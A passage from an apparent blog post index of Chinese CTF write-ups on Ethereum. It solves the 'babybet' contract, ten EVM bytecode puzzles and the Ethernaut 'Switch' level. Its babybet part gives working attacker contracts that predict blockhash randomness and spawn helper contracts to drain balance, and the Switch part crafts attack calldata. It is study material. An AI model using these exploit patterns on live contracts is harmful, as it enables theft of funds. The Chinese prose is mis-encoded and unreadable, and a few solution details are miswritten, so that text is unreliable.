i; i &lt; 889; i++) &#123; fake.airDrop(); &#125; &#125;&#125; babybet1. questionæºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162pragma solidity ^0.4.23;contract babybet &#123; mapping(address =&gt; uint) public balance; mapping(address =&gt; uint) public status; address owner; //Don&#x27;t leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough. //Gmail is ok. 163 and qq may have some problems. event sendflag(string md5ofteamtoken,string b64email); constructor()public&#123; owner = msg.sender; balance[msg.sender]=1000000; &#125; //pay for flag function payforflag(string md5ofteamtoken,string b64email) public&#123; require(balance[msg.sender] &gt;= 1000000); if (msg.sender!=owner)&#123; balance[msg.sender]=0;&#125; owner.transfer(address(this).balance); emit sendflag(md5ofteamtoken,b64email); &#125; modifier onlyOwner()&#123; require(msg.sender == owner); _; &#125; //get_profit function profit()&#123; require(status[msg.sender]==0); balance[msg.sender]+=10; status[msg.sender]=1; &#125; //add money function () payable&#123; balance[msg.sender]+=msg.value/1000000000000000000; &#125; //bet function bet(uint num) &#123; require(balance[msg.sender]&gt;=10); require(status[msg.sender]&lt;2); balance[msg.sender]-=10; uint256 seed = uint256(blockhash(block.number-1)); uint rand = seed % 3; if (rand == num) &#123; balance[msg.sender]+=1000; &#125; status[msg.sender]=2; &#125; //transfer function transferbalance(address to,uint amount)&#123; require(balance[msg.sender]&gt;=amount); balance[msg.sender]-=amount; balance[to]+=amount; &#125;&#125; ğŸ“Œ ç›®æ ‡ï¼šæˆåŠŸè°ƒç”¨payforflag() 2. analysis æ€è·¯å¤§å·®ä¸å·®ï¼Œé€šè¿‡ä¸¤ä¸ªåˆçº¦ä»£ç ï¼Œç”Ÿæˆå¤šä¸ªHelperå¸®åŠ©Hackerç§¯æ”’balanceã€‚ åˆå› ä¸ºrandæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥å¯ä»¥æå‰è®¡ç®—éšæœºæ•°ï¼Œå†æ ¹æ®éšæœºæ•°è¿›è¡ŒèµŒåšï¼Œï¼Œï¼Œæ‰€ä»¥å•Šä¸è¦èµŒåšï¼ŒåèµŒä¹è¾“ã€‚ 3. solveæ”»å‡»æ–¹å¼ï¼Œéƒ¨ç½²Hackerï¼ŒæˆåŠŸè°ƒç”¨2æ¬¡attack()ï¼Œå†è°ƒç”¨pwn()ã€‚ 1234567891011121314151617181920212223242526272829303132333435contract BabyBetHacker &#123; babybet bet; constructor(address _bet) public &#123; bet = babybet(_bet); &#125; function attack() public &#123; uint256 seed = uint256(blockhash(block.number-1)); uint rand = seed % 3; for (uint i; i &lt; 500; i++) &#123; new BabyBetHelper(address(bet), rand); &#125; &#125; function pwn() public &#123; bet.payforflag(&quot;BYYQ1030Hacker&quot;, &quot;BYYQ&quot;); &#125;&#125;contract BabyBetHelper &#123; babybet bet; constructor(address _bet, uint answer) public &#123; bet = babybet(_bet); bet.profit(); bet.bet(answer); bet.transferbalance(msg.sender, 1000); &#125;&#125; æ€»ç»“åŒºå—é“¾ä¸Šçš„ä¸€äº›ä¿¡æ¯æ˜¯å…·æœ‰å…±æ€§çš„ï¼Œæ¯”å¦‚åœ¨åŒä¸€ä¸ªå‡½æ•°ä¸­è°ƒç”¨äº†è¾ƒå¤šå‡½æ•°ï¼Œä¸”è¿™æ˜¯è¢«è°ƒç”¨å‡½æ•°ä¸­éƒ½æ¶‰åŠåˆ°äº†ä¸€äº›åŒºå—ä¿¡æ¯ï¼Œæ¯”å¦‚block.numberï¼Œnowç­‰ï¼Œä½†æ˜¯åªæœ‰åœ¨ä¸€ä¸ªåŒºå—ä¸­è¿™äº›å€¼éƒ½æ˜¯ç›¸ç­‰çš„ï¼Œæ„å‘³ç€æŸäº›éšæœºæ•°å¹¶ä¸éšæœºã€‚ã€‚ã€‚","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"EVM_Puzzles","slug":"CTFS/EVM puzzles/EVM_Puzzles","date":"2023-08-19T02:23:10.000Z","updated":"2023-08-19T02:23:10.000Z","comments":true,"path":"2023/08/19/CTFS/EVM puzzles/EVM_Puzzles/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/19/CTFS/EVM%20puzzles/EVM_Puzzles/","excerpt":"","text":"å‰è¨€ How to play? åˆ° GitHubä»“åº“ å°†æ•´ä¸ªæ–‡ä»¶å…‹éš†åˆ°æœ¬åœ°ã€‚ åœ¨ç»ˆç«¯ä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤ï¼š 1npm install 1npx harhat play ä¸€ä¸ªæ–¹ä¾¿æµ‹è¯•çš„ åœ¨çº¿ç½‘ç«™ æ“ä½œç å¤§å…¨ 1. puzzle_01æºç ï¼š 1234567891011121314############# Puzzle 1 #############00 34 CALLVALUE01 56 JUMP02 FD REVERT03 FD REVERT04 FD REVERT05 FD REVERT06 FD REVERT07 FD REVERT08 5B JUMPDEST09 00 STOP åˆ†æï¼š CALLVALUEè¡¨ç¤ºä¼ å…¥çš„msg.valueï¼Œå…¶å•ä½æ˜¯weiï¼› JUMPåˆ™æ˜¯è¡¨ç¤ºè°ƒè½¬åˆ°JUMPDESTæ ‡å¿—çš„ä½ç½®ï¼Œæ¯”å¦‚åœ¨æœ¬é¢˜ä¸­CALLVALUE &#x3D; 5ï¼Œåˆ™ä¼šæ‰§è¡Œ0x05ä½ç½®çš„ä»£ç ï¼Œä¸å‡ºæ‰€æ–™åº”è¯¥æ˜¯ä¼šæŠ¥é”™çš„ã€‚ æ‰€ä»¥æœ¬é¢˜åªè¦å‘é€8ï¼Œåˆ™å¯ä»¥æˆåŠŸæ‰§è¡Œã€‚ ç»“æœï¼š 2. puzzle_02æºç ï¼š 1234567891011121314############# Puzzle 2 #############00 34 CALLVALUE01 38 CODESIZE02 03 SUB03 56 JUMP04 FD REVERT05 FD REVERT06 5B JUMPDEST07 00 STOP08 FD REVERT09 FD REVERT åˆ†æï¼š CALLVALUEå’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼ŒCODESIZEåˆ™è¡¨ç¤ºä»£ç çš„å¤§å°ï¼Œè€Œä»é¢˜ç›®ä¸­ä¸éš¾çœ‹å‡º09è¡¨ç¤ºä»£ç å¤§å°ä¸º10bytesï¼Œè€ŒCODESIZEçš„å•ä½ä¹Ÿæ˜¯bytesï¼Œæ‰€ä»¥CODESIZEçš„å€¼æ˜¯10ã€‚ è¿™é‡Œå’Œé€†æ³¢å…°è¡¨è¾¾æœ‰ç‚¹åŒºåˆ«ï¼Œè¿™é‡Œçš„å‡æ³•è¡¨ç¤ºçš„æ˜¯ï¼šå½“è¯»å–åˆ°SUBæ“ä½œç æ—¶ï¼ŒEVMè¯»å–æ ˆçš„é¡ºåºä¸ºï¼šCODESIZE SUB CALLVALUE å³ 10 - CALLVALUEï¼Œè¦ä½¿æœ¬é¢˜æˆåŠŸæ‰§è¡Œï¼Œåˆ™éœ€è·³è½¬åˆ°06ï¼Œ10 - CALLVALUE = 06ï¼Œæ‰€ä»¥ä¸éš¾å¾—å‡ºCALLVALUE &#x3D; 4ã€‚ ç»“æœï¼š 3. puzzle_03æºç ï¼š 12345678910############# Puzzle 3 #############00 36 CALLDATASIZE01 56 JUMP02 FD REVERT03 FD REVERT04 5B JUMPDEST05 00 STOP åˆ†æï¼š è¿˜æ˜¯ä¸ºäº†è·³è½¬åˆ°è¢«JUMPDESTæ ‡å¿—çš„04æ ˆçš„ä½ç½®ï¼Œè€ŒCALLDATASIZEåˆ™æ˜¯ç»Ÿè®¡calldataæ•°æ®çš„é•¿åº¦ï¼Œæ‰€ä»¥åªéœ€éšä¾¿å‘é€ä¸€ä¸ª4bytesçš„æ•°æ®å³å¯ï¼Œå› ä¸ºåªèƒ½å‘é€åå…­è¿›åˆ¶ï¼Œä¸”åœ¨åå…­è¿›åˆ¶ä¸­ä¸¤ä½æ•°å­—è¡¨ç¤º1bytesï¼Œæ‰€ä»¥ç®€å•è®¾ç½®calldata = 0x00000000å³å¯ã€‚ ç»“æœï¼š 4. puzzle_04æºç ï¼š 12345678910111213141516############# Puzzle 4 #############00 34 CALLVALUE01 38 CODESIZE02 18 XOR03 56 JUMP04 FD REVERT05 FD REVERT06 FD REVERT07 FD REVERT08 FD REVERT09 FD REVERT0A 5B JUMPDEST0B 00 STOP åˆ†æï¼š é‡ç‚¹æ˜¯XORï¼Œå…¶è¡¨ç¤ºæŒ‰ä½å¼‚æˆ–ã€‚ä¸éš¾çœ‹å‡ºCODESIZE&#x3D; 12ï¼Œé€šå…³æ¡ä»¶ä¸ºCALLVALUE ^ CODESIZE = a = 10 = 1010ï¼Œé€šè¿‡ç®€å•çš„è®¡ç®—ä¸éš¾ç®—å‡ºCALLVALUEçš„å€¼ã€‚ 123CODESIZE 1100JUMPDEST 1010CALLVALUE 0110 æ‰€ä»¥å‘é€6ï¼Œå³å¯é€šå…³ã€‚ ç»“æœï¼š 5. puzzle_05æºç ï¼š 1234567891011121314151617############# Puzzle 5 #############00 34 CALLVALUE01 80 DUP102 02 MUL03 610100 PUSH2 010006 14 EQ07 600C PUSH1 0C09 57 JUMPI0A FD REVERT0B FD REVERT0C 5B JUMPDEST0D 00 STOP0E FD REVERT0F FD REVERT åˆ†æï¼š DUP1ï¼šå¤åˆ¶å †æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå€¼å¹¶å°†å…¶æ¨å…¥å †æ ˆçš„ç¬¬ä¸€ä¸ªä½ç½®ï¼ˆDUP2ï¼šè¡¨ç¤ºå¤åˆ¶ç¬¬äºŒä¸ªå€¼ï¼Œå¹¶å°†å…¶æ¨å…¥å †æ ˆçš„ç¬¬ä¸€ä¸ªä½ç½®ï¼Œå…¶ä»–åŒç†ï¼‰ï¼› MULï¼šè¡¨ç¤ºå°†å‰ä¸¤ä¸ªå€¼è¿›è¡Œç›¸ä¹˜å¹¶å‹å…¥æ ˆï¼› PUSH2 0100ï¼šè¡¨ç¤ºå°†0100è¿™ä¸¤ä¸ªå­—èŠ‚çš„å€¼å‹å…¥æ ˆé¡¶ï¼ŒPUSH1, PUSH3,PUSH4...è¡¨ç¤ºå‹å…¥å‡ ä¸ªå­—èŠ‚ï¼Œæœ€å¤§å‹å…¥32bytesï¼Œå³PUSH32; EQï¼šå¼¹å‡ºå‰ä¸¤ä¸ªå€¼ï¼Œæ¯”è¾ƒå…¶å€¼æ˜¯å¦ç›¸åŒï¼Œå¦‚æœç›¸åŒåˆ™å‹å…¥1ï¼Œå¦åˆ™å‹å…¥0ï¼› PUSH1 0Cï¼šè¡¨ç¤ºå°†ä¸€ä¸ªå­—èŠ‚çš„0cå‹å…¥æ ˆé¡¶ï¼› JUMPIï¼šå½“JUMPIæ‰§è¡Œæ—¶ï¼Œå®ƒä¼šä»å †æ ˆä¸­å¼¹å‡º 2 ä¸ªå€¼ã€‚ç¬¬ä¸€ä¸ªå€¼å°†æ˜¯è¦è·³è½¬åˆ°çš„æ–°ç¨‹åºè®¡æ•°å™¨ï¼ˆä¸€å¦‚æ—¢å¾€ï¼Œå®ƒå¿…é¡»æ˜¯æœ‰æ•ˆJUMPDESTæŒ‡ä»¤ï¼‰ã€‚ç¬¬äºŒä¸ªå€¼æ˜¯ä¸€ä¸ªå¸ƒå°”æ ‡å¿—ï¼ˆ0 æˆ– 1ï¼‰ï¼Œç”¨äºè¯„ä¼°æ˜¯å¦å¿…é¡»è·³è½¬ã€‚å¦‚æœå€¼ä¸º1åˆ™è·³è½¬ï¼›å¦åˆ™ç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚ ç»¼ä¸Šï¼Œè¦æ˜¯æ‰§è¡Œåˆ°JUMPIæŒ‡ä»¤ä¹‹å‰ï¼Œæ ˆä¸­å…ƒç´ ä¸º 00:0c 01:01 åªè¦æ‰§è¡Œ CALLVALUE DUP1 MUL PUSH2 0100 EQä¹‹åï¼Œè¿”å›çš„å€¼æ˜¯trueï¼Œå³å¯é€šè¿‡ï¼ˆCALLVALUE ^ CALLVALUE &#x3D;&#x3D; 0x0100 &#x3D; 16 ^ 2 &#x3D; 256ï¼‰ï¼Œæ‰€ä»¥å‘é€16ä¾¿å¯ä»¥é€šå…³ã€‚ ç»“æœï¼š 6. puzzle_06æºç ï¼š 12345678910111213141516############# Puzzle 6 #############00 6000 PUSH1 0002 35 CALLDATALOAD03 56 JUMP04 FD REVERT05 FD REVERT06 FD REVERT07 FD REVERT08 FD REVERT09 FD REVERT0A 5B JUMPDEST0B 00 STOP åˆ†æï¼š PUSH1 00ï¼šå¾€æ ˆä¸­å‹å…¥ 0bytesï¼› CALLDATALOADï¼šè¡¨ç¤ºä»æŒ‡å®šä½ç½®å¼€å§‹è¯»å–32bytesçš„æ•°æ®ï¼Œé¢˜ä¸­åˆ™æ˜¯è¡¨ç¤ºåç§»é‡ä¸º0ï¼Œå³ä»ç´¢å¼•ä¸º0çš„åæ ‡å¼€å§‹è¯»å–32bytesçš„æ•°æ®ï¼Œè¯»å–åˆ°çš„æ•°æ®çš„å€¼ä¸º0aï¼Œå³å¯é€šå…³ã€‚ ç»“æœï¼š 7. puzzle_07æºç ï¼š 1234567891011121314151617181920############# Puzzle 7 #############00 36 CALLDATASIZE01 6000 PUSH1 0003 80 DUP104 37 CALLDATACOPY05 36 CALLDATASIZE06 6000 PUSH1 0008 6000 PUSH1 000A F0 CREATE0B 3B EXTCODESIZE0C 6001 PUSH1 010E 14 EQ0F 6013 PUSH1 1311 57 JUMPI12 FD REVERT13 5B JUMPDEST14 00 STOP åˆ†æï¼š p1: 123400 36 CALLDATASIZE01 6000 PUSH1 0003 80 DUP104 37 CALLDATACOPY ä¸‰ä¸ªå †æ ˆè¾“å…¥åˆ†åˆ«æ˜¯ destOffsetï¼šå°†å¤åˆ¶ç»“æœçš„å†…å­˜ä¸­çš„å­—èŠ‚åç§»é‡ã€‚ offsetï¼šè¦å¤åˆ¶çš„è°ƒç”¨æ•°æ®ä¸­çš„å­—èŠ‚åç§»é‡ã€‚ sizeï¼šè¦å¤åˆ¶çš„å­—èŠ‚å¤§å°ã€‚ CALLDATACOPYå°±åƒä¸€ä¸ªâ€œç‰¹æ®Šâ€MLOADï¼Œç›´æ¥ä» calldata ä½ç½®è·å–è¦å­˜å‚¨åœ¨å†…å­˜ä¸­çš„æ•°æ®ã€‚è¿™äº›æŒ‡ä»¤çš„æ„æ€æ˜¯ï¼šä» calldata ä¸­å–å‡ºæ‰€æœ‰æ•°æ®å¹¶å°†å…¶å¤åˆ¶åˆ°ä»å†…å­˜ä½ç½® 0 å¼€å§‹çš„å†…å­˜ä¸­ã€‚ p2: 123405 36 CALLDATASIZE06 6000 PUSH1 0008 6000 PUSH1 000A F0 CREATE å®ƒçš„å †æ ˆè¾“å…¥åˆ†åˆ«æ˜¯ï¼š valueï¼šä»¥Weiä¸ºå•ä½çš„å€¼å‘é€åˆ°æ–°å¸æˆ·ã€‚ offsetï¼šå†…å­˜ä¸­çš„å­—èŠ‚åç§»é‡ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ï¼Œæ–°å¸æˆ·çš„åˆå§‹åŒ–ä»£ç ã€‚ sizeï¼šè¦å¤åˆ¶çš„å­—èŠ‚å¤§å°ï¼ˆåˆå§‹åŒ–ä»£ç çš„å¤§å°ï¼‰ã€‚ å †æ ˆè¾“å‡ºï¼š addressï¼šå·²éƒ¨ç½²åˆçº¦çš„åœ°å€ï¼Œå¦‚æœéƒ¨ç½²å¤±è´¥ï¼Œåˆ™ä¸º 0ã€‚ p3: 123450B 3B EXTCODESIZE0C 6001 PUSH1 010E 14 EQ0F 6013 PUSH1 1311 57 JUMPI EXTCODESIZEè·å–å·²éƒ¨ç½²åˆçº¦çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰å¹¶å°†å…¶æ·»åŠ åˆ°å †æ ˆä¸­ã€‚ä¹‹åï¼Œè°œé¢˜æ£€æŸ¥å·²éƒ¨ç½²åˆçº¦çš„å¤§å°æ˜¯å¦ç­‰äºå€¼ 1ã€‚å¦‚æœæ˜¯ï¼Œæˆ‘ä»¬æŒ‰ç…§ åˆ°è¾¾è¯¥JUMPIä½ç½®13å¹¶èµ¢å¾—æŒ‘æˆ˜ã€‚ The solution is to find a calldata value for which the result of EXTCODESIZE (done on the contract deployed with code from the calldata itself) return 1. å…·ä½“åˆ†æåšå®¢å¯è§å¦‚ä¸‹å¤§ä½¬åšå®¢ï¼š link1 link2 é‡ç‚¹ï¼š When the CREATE opcode is executed, only the code returned by the RETURN opcode will be the â€œruntime codeâ€ that will be executed in the future when the deployed contract will be called. The other part of the bytecode is just used once, only for the constructor part. *ä¸ªäººè§è§£ï¼šé€šè¿‡createæ“ä½œç åˆ›å»ºçš„åˆçº¦åœ°å€ï¼Œ[...] åˆ›å»ºä»£ç åœ¨äº‹åŠ¡ä¸­æ‰§è¡Œï¼Œè¯¥äº‹åŠ¡è¿”å›è¿è¡Œæ—¶ä»£ç çš„å‰¯æœ¬ï¼Œè¿™æ˜¯åˆçº¦çš„å®é™…ä»£ç ã€‚æ­£å¦‚æˆ‘ä»¬å°†çœ‹åˆ°çš„ï¼Œæ„é€ å‡½æ•°æ˜¯åˆ›å»ºä»£ç çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯è¿è¡Œæ—¶ä»£ç çš„ä¸€éƒ¨åˆ†ã€‚åˆçº¦çš„æ„é€ å‡½æ•°æ˜¯åˆ›å»ºä»£ç çš„ä¸€éƒ¨åˆ†ï¼›ä¸€æ—¦éƒ¨ç½²ï¼Œå®ƒå°±ä¸ä¼šå‡ºç°åœ¨åˆçº¦çš„ä»£ç ä¸­ã€‚ï¼Œå®é™…ä¸Šåˆå§‹åŒ–åˆçº¦çš„ä»£ç æŒ‡ä»¤ä¸ºæ‰§è¡Œcalldataä¹‹åï¼Œ**é€šè¿‡æ‰§è¡Œcalldataä¸­çš„RETURNè¯­å¥è¿”å›çš„ä»£ç æ‰æ˜¯å°†æ¥è°ƒç”¨éƒ¨ç½²çš„åˆçº¦æ—¶æ‰§è¡Œçš„runtime code*ã€‚ åˆ†æRETURN: ä»å¼€å§‹è¯»å–ä½ç½®çš„å†…å­˜åç§»é‡ è¦è¯»å–å’Œè¿”å›çš„å†…å­˜å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ ç®€å•æ¥è¯´ï¼Œå…¶è¿”å›çš„å€¼æ˜¯ä»memoryä¸­è¯»å–çš„ï¼Œä»å“ªè¯»å–ï¼Œè¯»å–å¤šå°‘å–å†³äºoffset,sizeã€‚ æ‰€ä»¥ï¼Œåªè¦æŒ‰è¦æ±‚æ‹¼æ¥è‡ªå®šä¹‰calldataå³å¯ï¼ŒåŸåˆ™æ˜¯ï¼šå°†ä¸€æ¡æŒ‡ä»¤å†™å…¥memoryï¼Œä¸”é€šè¿‡RETURNä»memoryä¸­è¿”å›è¿™ä¸€æ¡æŒ‡ä»¤ç”¨äºåˆå§‹åŒ–åˆçº¦ï¼Œè¿™æ ·ä¸€æ¥ï¼Œåˆçº¦ä¸­ä¾¿åªæœ‰ä¸€æ¡ä»£ç ï¼ŒEXTCODESIZEè¿”å›çš„å€¼ä¾¿æ˜¯1ã€‚ 12345678910## æ‹¼æ¥calldata #### å°†calldataå†™å…¥memoryPUSH1 60 ff ## mstore&#x27;value,åªè¦æ˜¯ä¸€ä¸ªå­—èŠ‚å³å¯PUSH1 60 00 ## mstore&#x27;offset,åœ¨memoryå†…å­˜ä¸­çš„å­˜å‚¨èµ·å§‹ç´¢å¼•## è¿™é‡Œé‡‡ç”¨MSTORE8ï¼Œè¿™åœ¨memoryä¸­çš„å­˜å‚¨æ–¹å¼ä¸ºï¼š0xff00000000000...(32ä½)MSTORE8 53 ## MSTORE8 æ“ä½œç ï¼Œåœ¨memoryä¸­å†™å…¥1bytes## ä»memoryä¸­è¿”å›ä»£ç ï¼Œç”¨æ¥æ‰§è¡Œåˆçº¦çš„åˆå§‹åŒ–PUSH1 60 01 ## RETURN&#x27;size,ä»memoryä¸­è¯»å–ä»£ç çš„å¤§å°(é•¿åº¦)PUSH1 60 00 ## RETURN&#x27;offset,ä»memoryä¸­è¯»å–ä»£ç çš„èµ·å§‹ç´¢å¼•RETURN f3 ## RETURN æ“ä½œç ,ä»memoryä¸­è¿”å›runtime code æ‰€ä»¥ï¼Œæ„é€ å‡ºæ¥çš„calldataä¾¿æ˜¯ï¼š 10x60ff60005360016000f3 ç»“æœï¼š (å¦‚ä¸‹è¿™ä¸ªç»“æœåŒç†ä¹Ÿå¯ä»¥ï¼Œ0x60ff6000526001601ff3) 8. puzzle_08æºç ï¼š 123456789101112131415161718192021222324252627############# Puzzle 8 #############00 36 CALLDATASIZE01 6000 PUSH1 0003 80 DUP104 37 CALLDATACOPY05 36 CALLDATASIZE06 6000 PUSH1 0008 6000 PUSH1 000A F0 CREATE0B 6000 PUSH1 000D 80 DUP10E 80 DUP10F 80 DUP110 80 DUP111 94 SWAP512 5A GAS13 F1 CALL14 6000 PUSH1 0016 14 EQ17 601B PUSH1 1B19 57 JUMPI1A FD REVERT1B 5B JUMPDEST1C 00 STOP åˆ†æï¼š p1: 123400 36 CALLDATASIZE01 6000 PUSH1 0003 80 DUP104 37 CALLDATACOPY å°†calldataæ‹·è´åˆ°memoryä¸­ã€‚ p2: 123405 36 CALLDATASIZE06 6000 PUSH1 0008 6000 PUSH1 000A F0 CREATE æ ¹æ®æ‹·è´åœ¨memoryä¸­çš„calldataåˆ›å»ºåˆçº¦åœ°å€ã€‚ p3: 123456780B 6000 PUSH1 000D 80 DUP10E 80 DUP10F 80 DUP110 80 DUP111 94 SWAP512 5A GAS13 F1 CALL SWAP5:å°†æ ˆé¡¶çš„00ä¸CRETAEåˆ›å»ºçš„åˆçº¦åœ°å€äº¤æ¢ä½ç½®ã€‚ åˆ†æCALL: gas: the amount of gas to send to the sub context created for the execution. address: the address on which the context will be executed value: value in wei to send to the address argsOffset: byte offset in the memory in number of bytes argsSize: byte size to copy from the memory with the previously specified offset retOffset: byte offset in memory in bytes from which you want to store the return data returned by the execution retSize: byte size to copy from the returned data p4: 123414 6000 PUSH1 0016 14 EQ17 601B PUSH1 1B19 57 JUMPI å³è¦æ±‚åˆçº¦è°ƒç”¨å¤±è´¥ï¼ŒEQçš„è¿”å›å€¼æ‰ä¸º1ï¼Œç¨‹åºæ‰å¯ä»¥æ­£ç¡®æ‰§è¡Œã€‚ æ‰€ä»¥åªè¦æœ¬ç€è°ƒç”¨å¤±è´¥å»å®ç°å³å¯ï¼ŒåˆFD REVERTï¼Œæ‰€ä»¥å¯ä»¥åœ¨puzzles_7çš„åŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹å³å¯ã€‚ ç”¨äºåˆå§‹åŒ–çš„æŒ‡ä»¤ä¸ºFDï¼Œåˆ™æœ‰ 1calldata = 0x60fd60005360016000f3 ç»“æœï¼š 9. puzzle_09æºç ï¼š 12345678910111213141516171819202122############# Puzzle 9 #############00 36 CALLDATASIZE01 6003 PUSH1 0303 10 LT04 6009 PUSH1 0906 57 JUMPI07 FD REVERT08 FD REVERT09 5B JUMPDEST0A 34 CALLVALUE0B 36 CALLDATASIZE0C 02 MUL0D 6008 PUSH1 080F 14 EQ10 6014 PUSH1 1412 57 JUMPI13 FD REVERT14 5B JUMPDEST15 00 STOP åˆ†æï¼š p1: 1234500 36 CALLDATASIZE01 6003 PUSH1 0303 10 LT04 6009 PUSH1 0906 57 JUMPI è¦æ±‚calldataçš„é•¿åº¦å°äº3bytesï¼ˆLTè¡¨ç¤ºå°äºï¼‰ p2: 12345670A 34 CALLVALUE0B 36 CALLDATASIZE0C 02 MUL0D 6008 PUSH1 080F 14 EQ10 6014 PUSH1 1412 57 JUMPI é€šè¿‡p1ä¹‹åï¼Œè¦æ±‚&#96;msg.value ^ calldatasize &#x3D;&#x3D; 0x08ã€‚ ç®€å•ï¼Œä»¤calldata = 0x00000006ï¼Œmsg.sender = 2 ç»“æœï¼š 10. puzzle_10æºç ï¼š 123456789101112131415161718192021222324252627############## Puzzle 10 ##############00 38 CODESIZE01 34 CALLVALUE02 90 SWAP103 11 GT04 6008 PUSH1 0806 57 JUMPI07 FD REVERT08 5B JUMPDEST09 36 CALLDATASIZE0A 610003 PUSH2 00030D 90 SWAP10E 06 MOD0F 15 ISZERO10 34 CALLVALUE11 600A PUSH1 0A13 01 ADD14 57 JUMPI15 FD REVERT16 FD REVERT17 FD REVERT18 FD REVERT19 5B JUMPDEST1A 00 STOP åˆ†æï¼š p1: 1234567800 38 CODESIZE01 34 CALLVALUE02 90 SWAP103 11 GT04 6008 PUSH1 0806 57 JUMPI07 FD REVERT08 5B JUMPDEST CALLVALUEå’ŒCODESIZEäº¤æ¢ä½ç½®ï¼ŒCODESIZE &#x3D; 0x1A &#x3D; 26ï¼Œè¦æ±‚msg.value &lt; 26ã€‚ p2: 12345678909 36 CALLDATASIZE0A 610003 PUSH2 00030D 90 SWAP10E 06 MOD0F 15 ISZERO10 34 CALLVALUE11 600A PUSH1 0A13 01 ADD14 57 JUMPI ISZERO è¦æ±‚ï¼š CALLDATASIEZE % 3 == 0ï¼Œä¸”msg.value + 0x0a == 0x19 == 25ï¼Œæ‰€ä»¥msg.value=15ã€‚ æ•…ï¼š 12CALLDATASIEZE % 3 == 0;msg.value == 15; æ‰€ä»¥ï¼š calldata å¯ä¸º 0x000006 ç»“æœï¼š å®Œç»“ å‚è€ƒé“¾æ¥ link1ï¼Œlink2","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"EVM Puzzles","slug":"CTFS/EVM-Puzzles","permalink":"https://biyouqiuqiu.com/categories/CTFS/EVM-Puzzles/"}],"tags":[{"name":"EVM_Puzzles","slug":"EVM-Puzzles","permalink":"https://biyouqiuqiu.com/tags/EVM-Puzzles/"}]},{"title":"Switch","slug":"CTFS/ethernaut/Switch ","date":"2023-08-18T10:23:10.000Z","updated":"2023-08-18T10:23:10.000Z","comments":true,"path":"2023/08/18/CTFS/ethernaut/Switch /","link":"","permalink":"https://biyouqiuqiu.com/2023/08/18/CTFS/ethernaut/Switch%20/","excerpt":"","text":"1. é¢˜ç›®1.1 é¢˜ç›® Just have to flip the switch. Canâ€™t be that hard, right? Things that might help:Understanding how CALLDATA is encoded. 1.2 æºç  12345678910111213141516171819202122232425262728293031323334353637383940// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Switch &#123; bool public switchOn; // switch is off bytes4 public offSelector = bytes4(keccak256(&quot;turnSwitchOff()&quot;)); modifier onlyThis() &#123; require(msg.sender == address(this), &quot;Only the contract can call this&quot;); _; &#125; modifier onlyOff() &#123; // we use a complex data type to put in memory bytes32[1] memory selector; // check that the calldata at position 68 (location of _data) assembly &#123; calldatacopy(selector, 68, 4) // grab function selector from calldata &#125; require( selector[0] == offSelector, &quot;Can only call the turnOffSwitch function&quot; ); _; &#125; function flipSwitch(bytes memory _data) public onlyOff &#123; (bool success, ) = address(this).call(_data); require(success, &quot;call failed :(&quot;); &#125; function turnSwitchOn() public onlyThis &#123; switchOn = true; &#125; function turnSwitchOff() public onlyThis &#123; switchOn = false; &#125;&#125; 2. åˆ†æ2.1 æœ¬åœ°è¦å°†switchOnçš„å€¼å˜æˆtrueï¼Œåˆ™å¿…é¡»è¦è°ƒç”¨turnSwitchOnå‡½æ•°ï¼Œè€Œè°ƒç”¨è¯¥å‡½æ•°å¿…é¡»è¦é€šè¿‡ä¿®é¥°å™¨onlyThisï¼Œè¯¥ä¿®é¥°å™¨è¦æ±‚è°ƒç”¨è€…ä¸ºæœ¬åˆçº¦ï¼Œè¿™è¦æ±‚äº†åªèƒ½åœ¨æœ¬åˆçº¦ä¸­é€šè¿‡ä½çº§è°ƒç”¨callæ¥å®ç°ã€‚è€ŒflipSwitchå‡½æ•°åˆ™æä¾›äº†è¿™ä¸€æ–¹æ³•ï¼Œä½†è¦é€šè¿‡ä¿®é¥°å™¨onlyOffã€‚ 2.2 è§£æä¿®é¥°å™¨onlyOff 12345678910111213modifier onlyOff() &#123; // we use a complex data type to put in memory bytes32[1] memory selector; // check that the calldata at position 68 (location of _data) assembly &#123; calldatacopy(selector, 68, 4) // grab function selector from calldata &#125; require( selector[0] == offSelector, &quot;Can only call the turnOffSwitch function&quot; ); _;&#125; æ³¨æ„calldatacopy(selector, 68, 4)ï¼Œè¿™é‡Œæ˜¯åªè¯»å–ä¼ é€’çš„msg.dataç¬¬68ä¸ªå­—èŠ‚å4ä¸ªå­—èŠ‚ï¼Œè¦æ±‚å…¶å€¼ç­‰äºturnOffSwitch.selectorã€‚ç„¶åä¾¿å¯ä»¥è‡ªå®šä¹‰ä¼ å…¥çš„dataã€‚ æŒ‰ç†æ¥è¯´ç›´æ¥é€šè¿‡å®ä¾‹ï¼Œä¼ å…¥68+4byteså³å¯å®Œæˆçš„ï¼Œå¯æ˜¯å®é™…ä¸Šå¹¶æ²¡æœ‰æˆåŠŸ 123456function calCalldata() internal view returns(bytes memory) &#123; return abi.encodePacked(onSelector, uint(0), uint(0), offSelector);&#125;function attack() public &#123; switch_.flipSwitch(calCalldata());&#125; åˆšå¼€å§‹è®©æˆ‘å¯çº³é—·äº†ï¼Œcalldatacopy(selector, 68, 